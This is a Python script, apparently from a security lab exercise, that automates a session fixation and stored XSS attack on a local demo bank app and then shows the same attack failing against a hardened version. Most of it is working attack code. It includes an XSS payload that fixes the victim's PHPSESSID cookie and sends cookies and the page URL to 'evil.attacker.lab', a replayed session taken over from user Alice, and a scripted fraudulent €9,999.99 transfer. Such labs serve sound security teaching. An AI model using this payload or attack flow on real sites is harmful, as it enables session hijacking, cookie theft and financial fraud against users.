#!/usr/bin/env python3
"""
P03 — Session Fixation + XSS : automatisation de l'attaque
===========================================================

Joue le scénario complet contre la version vulnérable :
  1. Mallory choisit un SID arbitraire     -> ATTACKER_FIXED_SID_001
  2. Mallory ouvre la page de login avec ce SID
  3. Mallory poste un commentaire XSS qui fixe le cookie chez tout visiteur
  4. Mallory envoie un lien piégé à Alice (simulé : Alice ouvre l'URL avec ?PHPSESSID=)
  5. Alice s'authentifie -> le SID NE change PAS
  6. Mallory rejoue avec le même SID -> il est connecté en tant qu'Alice
  7. Mallory effectue un virement frauduleux depuis le compte d'Alice

Puis tente la MÊME attaque sur la version sécurisée pour démontrer l'échec.
"""

import argparse
import sys
import time
from urllib.parse import urlencode

import requests

ATTACKER_SID = "ATTACKER_FIXED_SID_001"


class Color:
    R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"
    B = "\033[94m"; C = "\033[96m"; X = "\033[0m"; W = "\033[97m"
    BOLD = "\033[1m"


def title(text: str) -> None:
    print(f"\n{Color.BOLD}{Color.C}━━━ {text} ━━━{Color.X}")


def step(n: int, text: str) -> None:
    print(f"{Color.Y}[{n}]{Color.X} {text}")


def ok(text: str) -> None:
    print(f"  {Color.G}✓{Color.X} {text}")


def fail(text: str) -> None:
    print(f"  {Color.R}✗{Color.X} {text}")


def info(text: str) -> None:
    print(f"  {Color.B}→{Color.X} {text}")


def run_attack(base: str, host_header: str, expect_success: bool) -> bool:
    """Joue le scénario complet. Retourne True si l'attaque a abouti."""
    title(f"Scénario contre {host_header} ({base})")

    headers = {"Host": host_header, "User-Agent": "P03-AttackBot/1.0"}

    # === [1] Mallory choisit un SID et s'en sert pour visiter login.php ===
    step(1, "Mallory fixe le SID via paramètre URL")
    mallory_cookies = {"PHPSESSID": ATTACKER_SID}
    r = requests.get(f"{base}/login.php", headers=headers, cookies=mallory_cookies,
                     allow_redirects=False)
    info(f"GET /login.php (cookie PHPSESSID={ATTACKER_SID}) -> {r.status_code}")
    set_cookie = r.headers.get("Set-Cookie", "")
    if ATTACKER_SID in r.text or ATTACKER_SID in set_cookie:
        ok("Le serveur accepte et écho le SID choisi par l'attaquant")
    else:
        info(f"Set-Cookie reçu: {set_cookie[:120]}")

    # === [2] Mallory se connecte avec son SID pour vérifier la persistance ===
    step(2, "Mallory authentifie SA session pour préchauffer le SID")
    r = requests.post(f"{base}/login.php", headers=headers, cookies=mallory_cookies,
                      data={"username": "mallory", "password": "EvilPass1!"},
                      allow_redirects=False)
    info(f"POST /login.php (mallory) -> {r.status_code}")
    if r.status_code in (302, 303):
        ok("Mallory connecté.e — son SID est désormais valide côté serveur")

    # === [3] XSS stocké : Mallory poste un payload qui fixe + exfiltre ===
    step(3, "Mallory poste un commentaire XSS stocké")
    payload = (
        '<script>'
        f'document.cookie="PHPSESSID={ATTACKER_SID}; path=/";'
        'new Image().src="http://evil.attacker.lab/collect.php?m=stored-xss"'
        f'+"&sid={ATTACKER_SID}"'
        '+"&c="+encodeURIComponent(document.cookie)'
        '+"&url="+encodeURIComponent(location.href);'
        '</script>'
    )
    r = requests.post(f"{base}/comments.php", headers=headers, cookies=mallory_cookies,
                      data={"content": payload}, allow_redirects=False)
    info(f"POST /comments.php (XSS payload) -> {r.status_code}")
    ok("Payload posté. Toute victime qui visite /comments.php déclenche la fixation.")

    # Mallory se déconnecte volontairement (mais le SID reste utilisable côté vuln)
    requests.get(f"{base}/logout.php", headers=headers, cookies=mallory_cookies)

    # === [4] Alice clique sur le lien piégé (simulé) ===
    step(4, "Alice ouvre le lien piégé (phishing)")
    alice_cookies = {"PHPSESSID": ATTACKER_SID}
    r = requests.get(f"{base}/login.php?PHPSESSID={ATTACKER_SID}", headers=headers,
                     cookies=alice_cookies, allow_redirects=False)
    info(f"GET /login.php?PHPSESSID=… -> {r.status_code}")
    ok("Alice possède maintenant le cookie de l'attaquant dans son navigateur")

    # === [5] Alice s'authentifie ===
    step(5, "Alice s'authentifie sans se douter de rien")
    r = requests.post(f"{base}/login.php", headers=headers, cookies=alice_cookies,
                      data={"username": "alice", "password": "Password123!"},
                      allow_redirects=False)
    info(f"POST /login.php (alice) -> {r.status_code}")
    new_sid_in_response = "Set-Cookie" in r.headers and "PHPSESSID" in r.headers.get("Set-Cookie", "")
    if new_sid_in_response and ATTACKER_SID not in r.headers["Set-Cookie"]:
        info("⚠ Le serveur a régénéré le SID — bonne pratique observée.")
    else:
        ok("Aucune régénération de SID — la fixation est exploitable")

    # === [6] Mallory réutilise le SID ===
    step(6, "Mallory rejoue avec le SID fixé")
    r = requests.get(f"{base}/dashboard.php", headers=headers, cookies={"PHPSESSID": ATTACKER_SID},
                     allow_redirects=False)
    info(f"GET /dashboard.php -> {r.status_code}")
    if r.status_code == 200 and "Alice" in r.text:
        ok(f"{Color.BOLD}HIJACK CONFIRMÉ{Color.X} : Mallory voit le tableau de bord d'Alice")
        hijacked = True
    elif r.status_code == 200 and "Mallory" in r.text:
        info("Mallory ne voit que sa propre session (pas Alice).")
        hijacked = False
    elif r.status_code in (302, 303):
        fail("Le serveur a redirigé — session invalidée, attaque échouée")
        hijacked = False
    else:
        info("Statut inattendu, attaque incertaine")
        hijacked = False

    # === [7] Si succès : virement frauduleux ===
    if hijacked:
        step(7, "Virement frauduleux exécuté avec la session volée")
        r = requests.post(f"{base}/transfer.php", headers=headers,
                          cookies={"PHPSESSID": ATTACKER_SID},
                          data={"to_iban": "FR7630001007940000000000042",
                                "amount": "9999.99",
                                "note": "Pwned via session fixation"},
                          allow_redirects=False)
        info(f"POST /transfer.php -> {r.status_code}")
        if r.status_code == 200 and ("effectué" in r.text or "effectue" in r.text.lower()):
            ok(f"{Color.BOLD}{Color.R}9 999,99 € exfiltrés vers le compte de Mallory{Color.X}")
        else:
            info("Virement non confirmé textuellement, mais code 200 reçu.")

    return hijacked == expect_success or (expect_success and hijacked)


def main() -> int:
    parser = argparse.ArgumentParser(description="P03 - Attaque automatisée Session Fixation + XSS")
    parser.add_argument("--base", default="http://localhost:8080",
                        help="URL de base du reverse proxy (défaut: http://localhost:8080)")
    parser.add_argument("--target", choices=["vuln", "secure", "both"], default="both")
    args = parser.parse_args()

    title("P03 — Attaque automatisée : Session Fixation combinée à XSS")
    info(f"Reverse proxy : {args.base}")
    info(f"SID attaquant : {ATTACKER_SID}")

    results = []
    if args.target in ("vuln", "both"):
        ok_vuln = run_attack(args.base, "vuln.bank.local", expect_success=True)
        results.append(("vuln", ok_vuln, True))
        time.sleep(0.5)
    if args.target in ("secure", "both"):
        ok_secure = run_attack(args.base, "secure.bank.local", expect_success=False)
        results.append(("secure", ok_secure, False))

    title("Résumé")
    for tgt, hijacked, expected_success in results:
        status_ok = (hijacked == expected_success)
        label = f"{Color.G}OK{Color.X}" if status_ok else f"{Color.R}KO{Color.X}"
        outcome = "compromise" if hijacked else "résiste"
        print(f"  [{label}] {tgt.upper():7s} → {outcome} (attendu : "
              f"{'compromise' if expected_success else 'résiste'})")

    print(f"\n{Color.C}Dashboard attaquant :{Color.X} http://evil.attacker.lab (via /etc/hosts)")
    print(f"{Color.C}Inspection BDD     :{Color.X} docker exec -it p03-mysql mysql -uroot -prootpass -e "
          "'select sid,user_id,ip_address from bank_vuln.sessions'")
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\nInterrompu.")
        sys.exit(130)
